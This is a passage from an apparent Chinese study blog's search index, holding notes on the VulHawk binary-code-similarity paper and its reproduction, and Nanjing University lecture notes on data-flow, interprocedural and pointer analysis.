使用函数嵌入来搜索相似函数，这种属于粗粒度检测方法，导致较高的假阳性 使用匹配网络等方法在细粒度上计算每个函数对的相似性，结果好，但是计算成本高 方法： 提出了一种新的搜索策略，称为渐进式搜索策略，该策略包含两个子策略。首先，使用函数嵌入作为粗粒度搜索的全局摘要。其次，设计了候选函数的成对相似度校准，用细粒度信息补充函数嵌入，以保持漏洞检测的高精度\n函数嵌入搜索：为了在大型函数库中高效地检测相似函数，采用函数嵌入的欧式距离相似度对候选函数进行粗粒度检索，大大减小了细粒度检测的范围，减轻了计算负担。（算法 2 行） 相似度校准：它结合基本块、字符串常量和导入函数的信息，计算成对相似度得分，从中提取向量，并与函数级信息相结合，提高漏洞检测性能。 基本块级特征：如块嵌入分布和函数大小，可能会在函数级嵌入中丢失。（算法第 6 行）计算查询函数与其候选函数之间的基本块相似度，以补充块级信息 字符串常量特征：由于字符串常量和导入的函数在相似的函数对中是相同或相似的，它们的相似度也起到指示函数相似度的作用。（算法第 7 行） 导入函数：（算法第 8 行）使用 jaccard 指数计算两个导入函数集的相似度 在计算完上述三个向量后，我们将这些向量和函数嵌入搜索中的相似度 s 连接到向量 V 中。然后，我们将向量 V 输入前馈网络学习权重并预测最终函数相似度 s \u0026lsquo;。我们使用交叉熵损失函数来优化网络权值。最后，我们使用默认阈值 h 来过滤出与结果相似的函数。 评估 一对一比较 我们用一对一的函数相似度检测对 VulHawk 和基线的性能进行基准测试，这在之前的方法[27]，[34]，[41]，[55]中广泛执行。与他们的实验设置一样，我们为每个任务构建了一个由 50k 个正函数对和 50k 个负函数对组成的平衡评估集，以及一个由 1400 个正函数对和 140k 个负函数对组成的非平衡评估集。我们使用 (AUC) 作为测量值。AUC 是一个综合了所有可能分类阈值的模型的综合性能度量。表三显示了 VulHawk 与其他基线的比较结果。 如图所示，在所有实验设置中，VulHawk 在平衡集和非平衡集上的 AUC 得分均优于 SAFE、Asteria、GMN、PalmTree、Asm2Vec 和 Trex。\n一对多搜索 在本节中，我们将评估一对多搜索的性能。在研究[34]中，我们使用排名测量来评估模型在搜索应用程序中的性能，例如，漏洞搜索，它从一个大型数据库中检索候选函数。我们使用不同 K 阈值的召回率 ( Recall@K ) 作为指标，这是一个广泛使用的排名指标。我们使用不平衡集 (在第 IV-B 节中) 作为评价集。在评估中，模型计算每个查询函数与其正/负样本之间的相似性并进行排序。 我们收集了不同 top-K 结果下的召回率，并在图 9 中绘制了召回率与 k 的关系。结果表明，VulHawk 优于最先进的方法，在 XO 任务中获得了最好的 recall@1 ，为 0.935，在 XC+XO+XA 任务中获得了 0.879。在 XC+XO+XA 任务中，当检索到的结果数量超过 30 个时，每种方法的召回率趋于稳定，其中 VulHawk 在 0.994 左右达到 recall@30 , VulHawk- es 在 0.968 左右达到 recall@30 , VulHawk- s 在 0.988 左右达到 recall@30 , Trex 在 0.888 左右达到 recall@30 , SAFE 在 0.310 左右达到 recall@30 。XC+XO+XA 任务中 SAFE 的 recall@K 接近于随机概率 (K 100)，因为 SAFE 在跨架构任务中由于严重的 OOV 问题而不健壮，这在一对一的比较中已经得到了证明。在对大型函数库进行一对多搜索时，SAFE 的弱点被放大，只能得到 0.007 的 recall@1 。回答 r 问题 2: VulHawk 可以在大型函数库中准确地检索最佳候选函数。\n多对多匹配 多对多匹配用于在函数级测量两个给定二进制文件的相似性。作为他们的实验设置，我们为每个任务构造一个二进制对的评估集，并为每个二进制对生成最佳函数相似度匹配工具。我们在表 IV 中报告了每种工具在不同任务下的平均召回率和精度结果。 其中，基线在 XO 实验的 O0O3 中结果最低。在本实验中，VulHawk 的召回率为 0.876，比 SAFE、Asteria、Asm2Vec、BinDiff、PalmTree、GMN 和 Trex 的召回率分别提高了 385.9%、292.9%、208.6%、240.0%、211.6%、621.3%和 202.8%。有趣的是，VulHawk 最差的结果 (0.805) 是在 XC 实验中，而不是在 O0-O3 实验中。尽管如此，在 XC 实验中，VulHawk 仍然优于最先进的方法。O3 选项中，为了减小二进制函数的大小，提高效率，将 O0 选项中的冗余指令压缩为简洁的指令，强化了主要语义，去掉了函数的冗余语义，导致语义差异。VulHawk 使用简化指令提取二进制函数，并保留了主要语义，这有助于减轻优化级别的影响，使其能够适应交叉优化级别的实验。 图 10 用小提琴图展示了 XC、XA 和 XO 任务的查全率和查准率分布，我们在图上方标注了每种方法的平均结果。与 SAFE、BinDiff、Asteria、Asm2vec、PalmTree、GMN、Trex 相比，VulHawk 的召回率和精度概率分布更接近于 1 且更集中，而其他方法在不同场景下的结果分布分散且不稳定。这表明，VulHawk 的性能比其他基线更好，更稳定。 与一对一比较相比，多对多匹配的查全率和准确率较低，这是因为多对多匹配的负样本较多，错误匹配对会影响匹配算法的后续结果 (如匈牙利算法[25])。回答 RQ.3: VulHawk 可以用于在两个二进制文件之间匹配相似的函数，并且它在多对多匹配方面优于最先进的方法。\n运行时效率 我们评估了 VulHawk 在不同设置下的运行效率。给定一个函数，我们使用被评估模型提取特征并生成其函数嵌入，然后从存储库中检索前 10 个候选函数。记录时间是从提取特征到返回候选函数的相似度，每次测试测量十次，尽量减少意外因素。存储库大小设置为 103、104、105 和 106。 表 V 显示了在不同大小的存储库中搜索函数的时间成本及其吞吐量。吞吐量表示一秒钟内可以检索到的存储库函数的数量，它没有考虑嵌入生成的开销。结果表明，VulHawk 比 VulHawk- es 和 VulHawk- s 慢，这是因为 VulHawk 在嵌入生成过程中使用了基于熵的适配器，在搜索过程中使用了相似度校准。用较小的开销换取更高的精度和召回率是可以接受的。通过 GPU 加速，VulHawk 可以在大约 2 秒内从 106 个函数中搜索一个函数。回答 RQ.4: VulHawk 可以在大型函数库中保持高效率 (106)。\nAblation Study 基于熵的适配器：从表 III 可以看出，在 7 个一对一的功能比较任务中，VulHawkS 的 AUC 高于 VulHawk-ES。在图 9 中，VulHawk-S 在一对多搜索中获得了比 VulHawk-ES 更高的 recalls@K 。这些结果表明，VulHawk-S 的性能优于 VulHawkES，这表明性能的提升来自于基于熵的适配器的贡献，而不是额外的神经网络。基于熵的适配器将不同文件环境中的函数嵌入转移到相同的文件环境中，减轻了编译器和优化级别带来的差异。例如，在多对多匹配场景下，O0-O3 实验中，VulHawk-ES 的召回率为 0.793，而 VulHawk-S 通过基于熵的适配器缓解了不同文件环境造成的差异，召回率为 0.873。 相似度校准：从表 III 和图 9 可以看出，在一对一功能对比和一对多搜索场景下，VulHawk 的搜索结果优于 VulHawk- s。表四还显示，在多对多匹配场景中，VulHawk 比 VulHawkS 更精确。在 O0-O3 多对多匹配任务中，VulHawk 的精度从 0.593 提高到 0.818，这是因为 VulHawk 使用相似度校准从块级特征、字符串特征和导入函数中补充了函数相似度，使得相似度计算中考虑的信息更加全面，提高了检测精度。 文件环境识别 我们还评估了基于熵的文件环境识别的准确性。在这里，我们使用 10 倍交叉验证来分割所有二进制文件进行训练和评估，就像在传统的机器学习设置中一样。这些二进制文件来自不同的体系结构 (x86、arm 和 mips) 和不同的编译器 (GCC 和 Clang)。Pizzolotto 等人在函数字节上使用 CNN 模型和 LSTM 模型来识别文件环境。为了更好地演示我们的方法的性能，我们下载了他们预先训练好的模型，并将它们 (CNN 和 LSTM) 设置为比较。请注意，给定二进制文件的编译器和优化级别是未知的，并且在实践中是不同的，因此在评估一个参数 (例如编译器) 时，我们不会固定其他参数 (例如架构和优化级别) 以确保实用性。 图 11 显示了 VulHawk 等方法精度随时间的变化趋势。结果表明: (1) VulHawk 在编译识别和优化级别上均优于 CNN 和 LSTM。(2) VulHawk 的识别速度比 CNN 和 LSTM 的识别速度快。(3) VulHawk 的精度曲线稳定，而 CNN 和 LSTM 的精度曲线波动较大。这说明 VulHawk 在各种场景下更加泛化，而 CNN 和 LSTM 在某些情况下受到打击。我们深入分析如下。与 CNN 和 LSTM 相比，VulHawk 采用了包含二进制全局信息的熵流，而不是单个函数的原始字节，这使得函数的意外偏差对 VulHawk 影响不大。熵在不同的文件环境中保持明显的区别，而在原始字节上差异不明显。这使得 VulHawk 保持了较高的泛化性能，优于 CNN 和 LSTM。此外，VulHawk 在精度和效率上都优于 CNN 和 LSTM。由于 VulHawk 使用了一个强大的特征 (熵)，而且我们的模型比 CNN 和 LSTM 轻得多，例如，我们模型中的参数大小仅为 CNN 的 1.3%。 为了全面评估我们基于熵的文件环境识别，我们在不同架构 (x86、mips 和 arm)、文件大小 (小尺寸和大尺寸) 和文件类型 (库和可执行文件) 的各种场景中进行了实验。在这里，考虑到文件大小的分布，我们将小于 1024 KB 的文件视为小文件，反之则视为大文件。结果如图 12 所示，每个块都标注了分类比例。例如，在 O3 组预测中，95.4%被正确划分为 O3, 4.6%被划分为 O2，其中总体准确率为 96.2%。O0 选项实现了很高的精度，因为 O0 使用默认优化来减少编译时间，这与其他选项有很大不同。在 mips 和库文件中对 O2 和 O3 的识别达到了最差的结果，其中大多数错误识别集中在 O2 和 O3 的区别上。与 O0 相比，O3 选项增加了 285 个以上的优化，而 O3 只比 O2 多 3 个优化。因此，O2 和 O3 的双星具有高度相似的结构。由于来自 O2 和 O3 的二进制是高度相似的，这些错误识别是可以接受的，对二进制函数搜索的影响很小。当我们同时考虑 O2 和 O3 时，在所有情况下，区分它们与 O0 和 O1 的准确性都超过 90%。结果表明，我们的基于熵的文件环境识别在不同架构、文件大小和文件类型的各种场景下都是强大的。\n漏洞识别 。。。懒得看了，反正效果很好吧\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/vulhawk-cross-architecture-vulnerability-detection-with-entropy-based-binary-code-search/","summary":"中文译名：VulHawk：基于熵的二进制代码搜索的跨架构漏洞检测 作者：Zhenhao Luo 单位：国防科大 国家： #中国 年份： #2023年 来源： #N","title":"VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search"},{"content":"[[VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search]]\nGet Started Prerequisites Windows (MacOS and Linux also work) Python 3.8.2 (64 bit) PyTorch 1.13.1 CUDA 11.7 IDA pro 7.5+ (only used for dataset processing) Quick Start File Environment Identification python 2_FileEnvironmentIdentification.py\nFunction Embedding Generation python 3_function_embedding_generation.py\nBinary Function Similarity Detection python 4_binary_code_search.py\n论文基本流程 整体输入是二进制文件，然后分两部分进行：\nIRFM：对输入的二进制程序进行处理得到 IR，IR 作为 IRFM 的输入，输出是 IR 的词嵌入 首先进行 IR 生成和指令简化 然后使用 Masked Language Model (MLM)、根操作数预测 (ROP) 和相邻块预测 (ABP) 进行预训练 然后生成基本块嵌入 用基本块嵌入和 cfg 生成函数嵌入（GCN 网络是用来捕获 cfg 的） 基于熵的适配器： 首先计算二进制文件的熵值 使用残差神经网络作为分类器判断二进制文件属于哪种文件环境（编译器、优化级别等等） 上面两个一个得到二进制文件的函数嵌入，另一个得到二进制文件的文件环境，并且将二进制文件映射到一个中间环境中，减弱不同文件环境带来的影响。 用函数嵌入进行渐进式搜索\n采用函数嵌入的欧式距离相似度对候选函数进行粗粒度检索 结合基本块、字符串常量和导入函数的信息进行相似度校准 文件结构 example：测试用例 figure：算出来的熵流图 剩下的几个文件夹都是主程序需要用到的包文件 2：文件环境识别 3：函数嵌入生成 4：二进制代码搜索 SimilarityCalibration. pyd 是相似度校准 问题 虽然作者说 Linux 和 MacOS 都可以，但是实际上作者给出的自定义包文件有. pyd 文件，只有 Windows 下才可以载入。 看到 GitHub 上面有人给他提了这个 issue，但是作者没有回复。 这个代码结构是清晰的，数据也有，感觉是可以复现成功的。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/vulhawk-%E5%A4%8D%E7%8E%B0/","summary":"[[VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search]] Get Started Prerequisites Windows (MacOS and Linux also work) Python 3.8.2 (64 bit) PyTorch 1.13.1 CUDA 11.7 IDA pro 7.5+ (only used for dataset processing) Quick Start File Environment Identification python 2_FileEnvironmentIdentification.py Function Embedding Generation python 3_function_embedding_generation.py Binary Function Similarity Detection python 4_binary_code_search.py 论文基本流程 整体输入是二进制文件，然","title":"VulHawk 复现"},{"content":"IR Intermediate Representation 中间表示 3AC 三地址码 3-Address Code 每条3AC至多有三个地址，地址可以是名称，常量，编译器生成的临时变量 其实3AC就是指令的一种表示形式 BB 基本块 basic block 基本块是满足一下性质的连续3AC：只能从块的第一条指令进入；只能从块的最后一条指令离开 构建程序P的基本块算法 寻找leader（leader就是基本块的入口） P的第一条指令是一个leader 跳转目标是一个leader 跳转指令的后一条指令也是一个leader 一个基本块就是一个leader一直到下一个leader前的所有指令 CFG 控制流图 control flow graph 控制流图的一个结点可以是一条单独的3AC，更常见的是一个基本块BB 构建控制流图算法 首先构建程序基本块 构建边：块 A 和块 B 之间有一条边，当且仅当：A 的末尾有一条指向了 B 开头的跳转指令；A 的末尾紧接着 B 的开头，且 A 的末尾不是一条无条件跳转指令 数据流分析 PP 程序点 program point 在数据流分析中，我们会把每一个PP关联一个数据流值，代表在该点中可观察到的抽象的程序状态。 输入输出状态 每一条IR的执行，都会使状态从输入状态变成新的输出状态 输入/输出状态与语句前/后的 program point相关联。 转移方程 每条语句 s 都会使程序状态发生改变，这个所谓的方程f_x()对应的就是语句使得状态发生变化的操作 分析数据流有前向后后向两种，每条语句对应的状态转移方程也有两种。 控制流约束 这指的是状态的变化需要和控制流对应，比如说有两个基本块A1和A2都指向基本块B，那么B的输入状态就应该是A1、A2输出状态的交集 Reaching Definitions Analysis 到达定义分析 假设v在PPp处有定义x，如果存在一个路径从PPp到PPq，并且在该路径上没有v的其他定义，则称v的定义x到达p点。 如果在这条路径上有v的其他定义，则称变量v的定义x被killed 应用举例：分析程序是否存在变量未初始化：在程序入口为各变量引入一个 dummy 定值。当程序出口的某变量定值依然为 dummy，则我们可以认为该变量未被定义。 到达定义的转移方程 $$ \\begin{matrix}OUT[B]=gen_B\\cup(IN[B]-kill_B) \\ IN[B]=\\cup_{p,a,predecessor,of, B}OUT[P] \\end{matrix}\n$$\n从输入状态减掉kill掉的变量，并加入新生成的变量 到达定义的更新算法 一个迭代算法，具体看视频吧。 Live Variables Analysis 活跃变量分析 假设v在PPp处有定义x，如果存在一个路径从PPp到PPq，并且在该路径上使用变量v并且在使用前没有重新定义v，则称v的定义x在这段路径上活跃。 反之称为被killed 应用举例：可以用于寄存器分配，当一个变量不会再被使用，那么此变量就可以从寄存器中腾空，用于新值的存储。 活跃变量分析的转移方程（与上面reach分析不同的是，这里用backward的分析） $$ \\begin{matrix}OUT[B]=\\cup_{s,a,successor,of,B}OUT[S] \\ IN[B]=use_B\\cup(OUT[B]-def_B) \\end{matrix}\n$$\n算法 Available Expression Analysis 可用表达式分析 从流图入口结点到达 p 的每条路径都对 x + y 求了值，且在最后一次求值之后再没有对 x 或 y 赋值，则称x+y可用 应用举例：可用表达式可以用于全局公共子表达式的计算。也就是说，如果一个表达式上次计算的值到这次仍然可用，我们就能直接利用其中值，而不用进行再次的计算。 转移方程 $$ \\begin{matrix}OUT[B]=gen_B\\cup(IN[B]-kill_B) \\ IN[B]=\\cap_{p,a,predecessor,of, B}OUT[P] \\end{matrix}\n$$ 注意这里公式里的in是交集，因为定义中要求每条路径都对表达式求值而且最后一次求值后没有定义，所以对于每条路径的out进行merge用交集。 比如上图这个例子，左边的路径中对x进行赋值了，但是是在最后一次计算表达式之前赋值，所以out仍然是表达式。如果左边路径的BB中把最后一次计算去掉，那out就是空了，最后两条路径merge的in就是空。\n算法 上述算法的共同点都是不同迭代直到每个结点的值都不再更新了，那么此时每个结点的值就是真实程序会达到的状态吗，到达此状态后每个结点就真的不会再变化了吗？下面老师进行数学上的证明\nUpper and Lower Bounds 对于偏序集中的某子集 S 来说： 若存在元素 u 使得 S 的任意元素 x 有 x$\\sqsubseteq$u，那么我们说 u 是 S 的上界（Upper bound）。 同理，若存在元素 l 使得 S 的任意元素 x 有 l$\\sqsubseteq$x，那么我们说 l 是 S 的下界（Lower bound）。 然后我们衍生出最小上界和最大下界的概念： 在 S 的所有上界中，我们记最小上界（Least upper bound, lub）为 $\\sqcup$ S，满足所有上界 u 对 lub 有：$\\sqcup$ S $\\sqsubseteq$ u 类似地我们也能定义出最大下界（Greatest lower bound, glb）为$\\sqcap$ S。 并不是每个偏序集都有 lub 和 glb，但是如果有，那么该 lub, glb 将是唯一的。\nLattice, Semilattice, Complete and Product Lattic 给定一个偏序集，如果任意元素 a, b 都有 lub和glb，那么这么偏序集就叫做 格（lattice） 如果在此之上更加严格一些，任意集合都存在 lub 和 glb，那么我们说这个 lattice 为“全格（complete lattice）” 另外还有 Product Lattice，多个 lattice 的笛卡尔积也能形成一个新的 lattice。 Data Flow Analysis Framework via Lattice 一个数据流分析框架（D, L, F）由以下元素组成：\nD: 数据流的方向，前向还是后向 L: 包含了数据值 V 和 meet, join 符号的格 F: V -\u0026gt; V 的转移方程族 从而，数据流分析可以被视为在 lattice 的值上迭代地应用转移方程和 meet/join 操作符。\n参考 数据流分析 1\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%89%8D5%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"IR Intermediate Representation 中间表示 3AC 三地址码 3-Address Code 每条3AC至多有三个地址，地址可以是名称，常量，编译器生成的临时变量 其实3AC就是指令的一种表示形式 BB 基本块 basic block","title":"南大软件分析前5节笔记"},{"content":"视频： 南京大学《软件分析》课程07（Interprocedural Analysis 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 软件分析（七）Inter-procedural Analysis - 知乎 (zhihu.com) 软件分析 - 知乎 (zhihu.com) PPT： Interprocedural Analysis (nju.edu.cn)\n1.Motivation 1. 1为什么需要过程间分析（Interprocedural Analysis） 我们之前学习的是过程内分析（Interprocedural Analysis），过程内分析聚焦于函数内部，对于函数间的调用采取的策略是最保守（安全）的假设，但是安全性高伴随的就是精确度低，如下图，过程内分析就会将变量 x，y，n 设置为 NAC 但是过程间分析增加了 call 和 return 边，这样可以将不同函数的数据流信息通过边来传输，如下图所示，x，y，n 分别为 42， 43， 10 想要进行过程间分析，那么我们就需要调用图（call graph）\n1. 2调用图 调用图就是程序中调用关系的表示，本质是调用边的集合，从调用点（call-sites）到目标函数（target methods / callees）的边 应用：是所有过程间分析（跨函数分析）的基础，对于程序优化，程序理解，程序调试等有很重要的作用。\n1. 3针对面向对象程序设计语言 (OOPLs) 的调用图构造 主要有如下几种构建算法，从上往下精度变高，速度变慢。主要聚焦于第一个和最后一个算法 1.4Java 的调用分类 OO 语言的调用图构建的关键（难点）所在就是虚拟调用，因为它的目标函数有多个，并且需要在运行时才能确定。 1.5Method Dispatch of Virtual Calls 因为在运行中，一个虚拟函数的 resolved（意思就是把这个虚拟调用“解”为目标函数）基于两点：receiver objects 的类型和调用方法的签名（signature）。 O 是 receiver，foo 是方法签名 Signature 是方法的一个标识：\nSignature = class type（类） + method name（方法名字） + descriptor Descriptor = return type（返回类型） + parameter types（参数类型） 如下图的例子，表示了类 C 中的方法 foo 的 signature（旁边是简写方法） 接下来介绍求解目标函数的方法 dispatch (c, m) ，c 表示 reciever object，m 表示函数签名 如上图所示，当 c 对应的类中的非抽象方法（m‘）（非抽象方法是指实际可执行的函数主体）与 m 具有相同的名字和 descriptor，返回 m‘，否则递归执行 dispatch（c‘，m），c\u0026rsquo;是 c 的父类。 实例： 2.Class Hierarchy Analysis (CHA) 类层级分析 前提：需要整个程序的类层次结构信息 (继承结构) 原理：假设接收变量 a 可以指向类 a 的对象或 a 的所有子类，通过查找类 A 的类层次结构来解析目标方法 算法： cs 就是 call site 对于静态调用，直接返回函数签名 m，目标函数就是该类中的静态函数 (34条消息) java总结 第五章 静态变量和静态函数 认识封装_mycamelllia的博客-CSDN博客_为什么静态变量可以通过类访问也可以通过对象访问 Java中使用静态方法的情况和原因-CJavaPy 对于特殊调用，取得函数签名的类型，递归调用 dispatch 方法 对于私有函数和构造函数，它们就在当前类中，dispatch 返回的就是 m 父类函数就需要递归去父类找目标函数 对于虚拟调用，首先取得 cs 的变量的声明类，然后在该类本身和该类的子类中递归解析目标函数 示例： C 的声明类型是 C，没有子类，所以解析目标函数只会在 C 类中找 同理，A 的声明类型是 A，有子类 B，C ，D，所以都要去找 B 的声明类型是 B，首先找 B 本身，但是 B 本身没有函数，根据 dispatch 方法需要去它的父类去找，然后找 B 的子类 那么如果 b 示例化了呢。 CHA 算法仍然会把 C.foo 和 D.foo 解析到，但是实际上因为 b 已经实例化，所以这两个函数根本不会用，这是 CHA 的弊端。\n2.1CHA 的特点 CHA 优点是速度快，只考虑声明类型，忽略数据流和控制流；缺点是准确度低。 本类中有同名函数就在本类和子类找，没有就从父类找，接着找父类的子类中的同名函数（CHA 分析）。 CHA 在 IDE 中用的比较多\n2.2利用 CHA 构造调用图 基本思想就是遍历每个函数中的每个调用指令，调用CHA的Resolve()找到对应的目标函数和调用边，函数+调用边=调用图。 WL 是待解析的方法 CG 是调用图，调用边的集合 RM 可达方法的集合（就是已经解析过的方法，避免重复解析） 老师在这里讲了一个建图的例子，建议看视频走一遍\n3. 过程间的控制流图 Interprocedural Control-Flow Graph CFG 表示单个方法的结构，ICFG 表示整个程序的结构 程序的 ICFG 由方法的 CFG 组成，不同程序的 CFG 通过调用边和返回边互联，组成了 ICFG 调用边 call edges：从调用点到被调用者的入口节点 返回边 return edges：从调用的出口节点到从被调用者的出口节点到其调用点 (即返回点) 后面的语句。 实例： 4. 过程间数据流分析 Interprocedural Data-Flow Analysis 过程间分析和过程内分析的区别 Call edge transfer：将数据流从调用站点传输到被调用方的入口节点 (沿调用边)（传输参数值） Return edge transfer：将数据流从被调用方的出口节点传输到返回站点 (沿返回边)（传输返回值） Node transfer：和过程内常量传播是一样的，对每个调用点，将等号左边部分 kill 掉。（意思就是该结点的 out 要把在 in 中把结点内的左边变量去掉，为啥呢，左边变量的值交给返回边来生成） 示例 注意图中有两条 call-to-return 边，这个边是不能省去的，因为这种类型的边负责了本地数据的流动，比如说那个 a 和 c 没有参与函数的调用，那么它俩就顺着这个边流到了下一个结点，而无需也去 ten 方法里面绕一圈，提高分析的效率。 最后两个结点也解释了为啥要 kill 掉 LHS (left hand side 等号左边的值)，如果不 kill 掉 b，那么最后一个结点的 b 将会有两个输入 7 和 10，那么分析结果 b 就是一个非常量 NAC 了。 ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%83%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"视频： 南京大学《软件分析》课程07（Interprocedural Analysis 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大","title":"南大软件分析第七节笔记"},{"content":"视频：南京大学《软件分析》课程09（Pointer Analysis - Foundations I）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 软件分析 - 知乎 (zhihu.com) PPT： Pointer Analysis: Foundations (nju.edu.cn)\n1指针分析规则 首先确定分析域和记号的表示 变量、函数、对象、实例域、指针、指向关系 针对上节课末尾提到的四种句子进行分析 横线上的是前提条件，横线下的是结论\n2 如何实现指针分析 本质上指针分析就是要将指针关系通过指针（variables\u0026amp;fields）进行传播 关键在于当 pt (x) 发生改变，将改变的部分传播到 x 相关的指针。 用图来解决如何传播的问题\nPFG Pointer Flow Graph 指针流图 程序的指针流图是一个有向图，它表示对象如何在程序中的指针之间流动。\nNodes：指针，A node n represents a variable or a field of an abstract object Edges：An edge 𝑥 → 𝑦 means that the objects pointed by pointer 𝑥 may flow to (and also be pointed to by) pointer y 基于程序语句和相应的规则往 PFG 中添加边 基于 PFG，指针分析可以通过计算 PFG 的传递闭包来解决，如下图：基于 PFG，语句 j 可以从结点 b 沿着路径 b、a、oi. f、e 来传播 综上，指针分许分为两步\n构建 PFG 基于 PFG 传播指向关系信息 这两步互相依赖，相辅相成。传播指向信息需要基于构建好的 PFG，在传播指向信息的同时 PFG 也在动态更新。\n3 指针分析的算法 WL 包含了等待处理的指向关系，其中的元素是指针 n 和指向关系集合 pts，\u0026lt;n,pts\u0026gt;，表示 pts 应该被添加到 pt (n) 中。 AddEdge AddEdge (s, t) 是将 s-\u0026gt;t 这条边加到 PFG 中：\n当 PFG 中没有 s-\u0026gt;t 时，将这条边加入 PFG 中 如果 s 的指向关系（pt (s)）不为空，那么就需要将 s 的指向关系传播到 t，所以在 WL 中添加\u0026lt;t,pt(s)\u0026gt; Propagate Propagate (n, pts) 是将 pts 添加到 n 的指向关系中：\n如果 pts 不为空，那么就将 pts 和 pt (n) 合并 然后将 pts 传播到结点 n 可以指向的所有结点中 Main Algorithms 首先初始化算法，WL 和 PFG 为空，并处理所有的 new 语句 处理所有的 assign 语句 处理 WL 中的条目 取出\u0026lt;n, pts\u0026gt;，进行去重操作，避免冗余，将去重后的指向关系向 n 传播 当 n 表示一个变量，那么可能需要去处理 store 和 load 指令 如果变量 x 有 store 指令，则添加一条边 y 指向变量 x 指向的 oi 的 field 最开始有点奇怪那个把 oi 从 $\\Delta$ 取出来的操作，是因为已经执行过 propagate 了，此时变量 x 新指向的就是 $\\Delta$，所以 $\\Delta$ 就是 x，x 就是 $\\Delta$ 如果变量 x 有 load 指令，则添加一条边 oi 的 field 指向 y 老师给了个例子，建议看视频过一遍例子。 课间提到了几个 Java 的开源静态分析项目：Soot、WALA、Chord。\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B9%9D%E8%8A%82pointer-analysis-foundations-i/","summary":"视频：南京大学《软件分析》课程09（Pointer Analysis - Foundations I）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息","title":"南大软件分析第九节——Pointer Analysis - Foundations I"},{"content":"视频： 南京大学《软件分析》课程 08（Pointer Analysis 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 软件分析 - 知乎 (zhihu.com) PPT： Pointer Analysis (nju.edu.cn)\nMotivation CHA 算法存在缺陷（上一节课有说） 上一节提到过 CHA 算法是针对 call site 的声明类寻找目标函数，所以如上图所示，n.get 的声明类是 Number，Number 有三个子类，所以找到的目标函数就是三个结果，但是这个结果是不准确的，所以我们需要用到指针分析，去寻找 call site 真正指向的那个函数。\nIntroduction to Pointer Analysis 指针分析 指针分析是基本的静态分析，用于计算一个指针可以指向的内存位置，对于面向对象程序来说是计算一个指针（变量或字段）可以指向哪些对象 指针分析是一种 may 分析，它的分析结果是可以指向的对象的集合 如上图的例子，指针分析得到的是指向关系（point-to relations） 指针分析和别名分析的区别 两个密切相关但不同的概念 指针分析: 指针可以指向哪些对象? 别名分析: 两个指针可以指向同一个对象吗? 别名信息可以从指向关系中获得\n指针分析的应用 基本信息（别名分析/调用图） 编译优化（嵌入虚拟调用） 漏洞（空指针） 安全分析（信息流） Key Factors of Pointer Analysis 指针分析是一个复杂的系统，许多因素都会影响指针分析的精度和效率 堆抽象 程序动态执行时，堆对象个数理论上是无穷无尽的，但静态分析无法处理这个问题。所以为保证指针分析可以终止，我们采用堆抽象技术，将无穷的具体对象抽象成有限的抽象对象。也即，将有共性的对象抽象成 1 个静态对象，从而限制静态分析对象的个数。 本节介绍的堆抽象技术是目前最常用的堆抽象技术——allocation-site 技术\n原理：将动态对象抽象成它们的创建点（Allocation-Site），来表示在该点创建的所有动态对象。Allocation-Site 个数是有限的。 上下文敏感 Context-sensitive：根据某函数调用上下文的不同，多次分析同一函数。 Context-insensitive：每个函数只分析一次。 流敏感 流敏感 考虑语句顺序（控制流）的影响 流敏感会在每个程序点都保存一份指针指向关系映射 流不敏感 把程序当做无序语句的集合。 对整个程序保存一份指向关系映射 目前流敏感对 Java 提升不大，不过在 C 中很有效，本课程分析的是 Java，并且流不敏感技术相对简单，所以重点讨论流不敏感技术。 分析范围 Whole-program 全程序：分析全程序的指向关系。 Demand-driven 需求驱动：只分析影响特定域的指针的指向关系。 实际上现在大多是都是做的全程序的分析，因为需求分析分析的特定域中的指针可能依赖于其他域，所以需求分析计算指向关系最后的计算量可能不比全程序分析快多少。并且如果每一处需求都要进行一次计算，这些计算可能互相有重叠的地方，所以可能需求分析还会慢一点。 What Do We Analyze 主要集中于可以产生指向关系的语句 以 java 为例，有一下几种指针：\nLocal variable：x Static field：C.f (有时候被称为全局变量) instance field：x.f（对象的 field) Array element：array[i] （静态分析往往没办法确定下标，一般是将整个 array 存到一个 field 